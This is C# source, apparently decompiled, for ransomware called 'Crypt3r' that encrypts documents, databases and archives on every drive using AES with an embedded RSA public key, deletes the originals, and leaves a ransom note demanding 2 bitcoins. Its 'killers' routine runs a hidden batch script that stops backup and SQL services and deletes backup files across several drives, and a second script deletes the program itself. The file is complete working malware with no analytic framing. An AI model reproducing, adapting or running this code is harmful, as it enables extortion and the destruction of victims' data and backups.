using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.ServiceProcess;

namespace Crypt3r;

internal class Program
{
	private static readonly string pubKey = "<RSAKeyValue><Modulus>rWCKSB0ToYXx616kU5cMP9CsgdkWgOW+ZLtcCcDcI5U2QIolO/Bv7M2hV8BBNT0w3MMCL9rVAFfb5raQGDP8iHgG4bmwtxof9R1kALGkmxRKkjWhGgORSeH47G0QvbtPCqZjaOZ5SS11DkhG1qU7+UrbDiVpOVtxpl/+qs4p5Yr4co+Xz1Ad/a/mK2qIYi+BWJEZjP/ocrwkjG5F9ImwuhHP6o5bsowQ7dAaaa9lKhf4cCp+UQfXOzYH5xI2lNuxZdfKMNCCGwY5TEP0Scq34VIPJ8YeerL1JGaz6c3XqHxTnNv8HvPCLULf2zpJ04bz29af/KoapLUdGD+QLtu9o6DXjcDryB9cPVjx2bLSwicF1Z04o4rxiSiCiAmmvk/GVxJXtIACk9bqJFKvjQHD5dOgGkvKCFKBAJRHvo18vsq4RpDDPDD0Edd6X+TG3eFWk5mfKFFmb8KABmEjtG/OkjSUCXLjA5QbE2MBuLeJSDr31ShTPJu5O6/TjtJbHiynE63nawvenkSBC2LNeRkibBnHIV9DKFYXZXQdaP8COms8prE8UC2eXCjEUX+X+gY7cTMLktg3Nd0tayivcpCxz9LdB4w268DUfUTD+RD30foDemlE/BbTjlL0VcAEXZXmjmNvWMp26NOZIed7Ze2Z9fQr5n6wcgELYerkAo6jCkFF7R8iji9I433RG8YnerVy+L5HspQRWQ2MUYqcK8W0PlQ9wX28GZ6jv+dkU/3J23zfzg5jU4Rf1Z56a09lklXxJzKkimq7aLsnjs0VUDI12EUK/vZbSlQssAhQa1mKypo44RnXIitaK51twUXBfmwlSD7T6VI6lMUvkvYoQeQa839fgIcI5y23mMbhZc5pfB8UsHshG+eHXGUopx4l2MUlO9OTKJqJZgMYizq1BBe/uUprM6TXPNUj2STcPv4SbrrSaYe/21P8L92S+Tue26anfUQk8KmbwZte4bw9JCl3K3ke71bAN+6MgnrvOadCsASLxEwCUmBpj1JekZoJijOX00RQO8DwpWp3JxSgI8FBj28oucMuAm+wHENzUJ3BY4i2YqMBGudfCYI3KY3BdvjQQByGgT9jVcEBalYTWvurtshZ04VwFNtjBqoPLB9ZQsi/KFc/OZC2w3bIPMap6ApRHNdm+RqPc89gPBsoJXMi9NC+rZ7FRECV9UpfHKWeroNgjKJE6frbbfD2dvrcoMidYFIjp46EylFp/5Q2+nDIROpL482mEdYgTIuQxXYTT1oClw1Bo9nyDuqPR6kqshrMY847jrFu18CKP9gbAeYMfHzplOHLqEvWY6d82xCPJ+Wcv5+JUc2N97rIseUMGDm9iwVUftRuWwMW/gwQ1NOcVQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static readonly List<string> cryFilter = new List<string>
	{
		"*.vhdx", "*.ndf", "*.wk", "*.xlsx", "*.txt", "*.doc?", "*.xls", "*.mdb", "*.mdf", "*.sql",
		"*.bak", "*.ora", "*.pdf", "*.ppt?", "*.dbf", "*.zip", "*.rar", "*.aspx", "*.php", "*.jsp",
		"*.bkf", "*.csv"
	};

	private static void Main(string[] args)
	{
		try
		{
			killers();
		}
		catch
		{
		}
		if (args.Length != 1)
		{
			Console.WriteLine("donot cry :)");
		}
		else
		{
			if (!"cc".Equals(args[0]))
			{
				return;
			}
			foreach (string item in cryFilter)
			{
				try
				{
					CryFiles(item);
				}
				catch
				{
				}
			}
			Console.WriteLine("Finished! :(");
			writetx();
			TestForKillMyself();
		}
	}

	private static void CryFiles(string filter)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if ((driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Removable) && !driveInfo.IsReady)
			{
				continue;
			}
			foreach (string file in GetFiles(driveInfo.Name, filter, recursive: true))
			{
				CryFile(file);
			}
		}
	}

	private static void CryFile(string filename)
	{
		FileInfo fileInfo = new FileInfo(filename);
		if (fileInfo.IsReadOnly)
		{
			return;
		}
		string outputFilePath = filename + ".cring";
		try
		{
			Console.WriteLine("[+] " + filename);
			if (EncryptFile(fileInfo.FullName, outputFilePath, pubKey))
			{
				fileInfo.Delete();
			}
		}
		catch
		{
		}
	}

	private static IEnumerable<string> GetFiles(string folder, string filter, bool recursive)
	{
		if (folder.StartsWith("C:\\Windows"))
		{
			yield break;
		}
		string[] array = null;
		try
		{
			array = Directory.GetFiles(folder, filter);
		}
		catch
		{
		}
		string[] array2;
		if (array != null)
		{
			array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				yield return array2[i];
			}
		}
		if (!recursive)
		{
			yield break;
		}
		array = null;
		try
		{
			array = Directory.GetDirectories(folder);
		}
		catch
		{
		}
		if (array == null)
		{
			yield break;
		}
		array2 = array;
		foreach (string folder2 in array2)
		{
			foreach (string file in GetFiles(folder2, filter, recursive))
			{
				yield return file;
			}
		}
	}

	public static bool EncryptFile(string inputFilePath, string outputFilePath, string publicKey)
	{
		bool flag = false;
		using AesManaged aesManaged = new AesManaged();
		byte[] array = new byte[aesManaged.KeySize / 8];
		byte[] array2 = new byte[aesManaged.BlockSize / 8];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetBytes(array);
			rNGCryptoServiceProvider.GetBytes(array2);
		}
		byte[] array3 = new byte[array.Length + array2.Length];
		Array.Copy(array, array3, array.Length);
		Array.Copy(array2, 0, array3, array.Length, array2.Length);
		array3 = EncryptData(array3, publicKey);
		byte[] bytes = BitConverter.GetBytes(array3.Length);
		using (ICryptoTransform transform = aesManaged.CreateEncryptor(array, array2))
		{
			using FileStream fileStream2 = new FileStream(inputFilePath, FileMode.Open);
			using FileStream fileStream = new FileStream(outputFilePath, FileMode.Create);
			using CryptoStream destination = new CryptoStream(fileStream, transform, CryptoStreamMode.Write);
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array3, 0, array3.Length);
			fileStream2.CopyTo(destination, 20000);
		}
		return true;
	}

	public static byte[] EncryptData(byte[] data, string publicKey)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(data, fOAEP: true);
	}

	public static void TestForKillMyself()
	{
		string contents = "@echo off\r\n                           :tryagain\r\n                           del %1\r\n                           if exist %1 goto tryagain\r\n                           del %0";
		File.WriteAllText("killme.bat", contents);
		Process.Start(new ProcessStartInfo
		{
			FileName = "killme.bat",
			Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"",
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}

	public static void passql()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		ServiceController val = new ServiceController("mssqlserver");
		ServiceControllerStatus status = val.get_Status();
		if (((object)(ServiceControllerStatus)(ref status)).Equals((object)(ServiceControllerStatus)4))
		{
			val.Stop();
		}
	}

	public static void killers()
	{
		string contents = "@echo off\r\n                          \r\n                          \r\n                           net stop BMR Boot Service /y\r\n                           net stop NetBackup BMR MTFTP Service /y\r\n                           sc config SQLTELEMETRY start= disabled\r\n                           sc config SQLTELEMETRY$ECWDB2 start= disabled\r\n                           sc config SQLWriter start= disabled\r\n                           sc config SstpSvc start= disabled\r\n                           taskkill /IM mspub.exe /F\r\n                           taskkill /IM mydesktopqos.exe /F\r\n                           taskkill /IM mydesktopservice.exe /F\r\n                           \r\n                           del /s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.* d:\\*.set d:\\*.win d:\\*.dsk\r\n                           del /s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.* e:\\*.set e:\\*.win e:\\*.dsk\r\n                           del /s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.* f:\\*.set f:\\*.win f:\\*.dsk \r\n                           del /s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.* g:\\*.set g:\\*.win g:\\*.dsk\r\n                           del /s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win h:\\*.dsk\r\n                           del %0";
		File.WriteAllText("kill.bat", contents);
		Process.Start(new ProcessStartInfo
		{
			FileName = "kill.bat",
			Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"",
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}

	public static void writetx()
	{
		string contents = "Oops, your computer is encrypted. You need to pay 2 bitcoins to decrypt the files you need. If you don’t reply within three days, you won’t be able to get the decryption service.   Contact: qkhooks0708 @protonmail.com";
		File.WriteAllText("c:\\deReadMe!!!.txt", contents);
		File.WriteAllText("C:\\Users\\Public\\Desktop\\deReadMe!!!.txt", contents);
	}
}
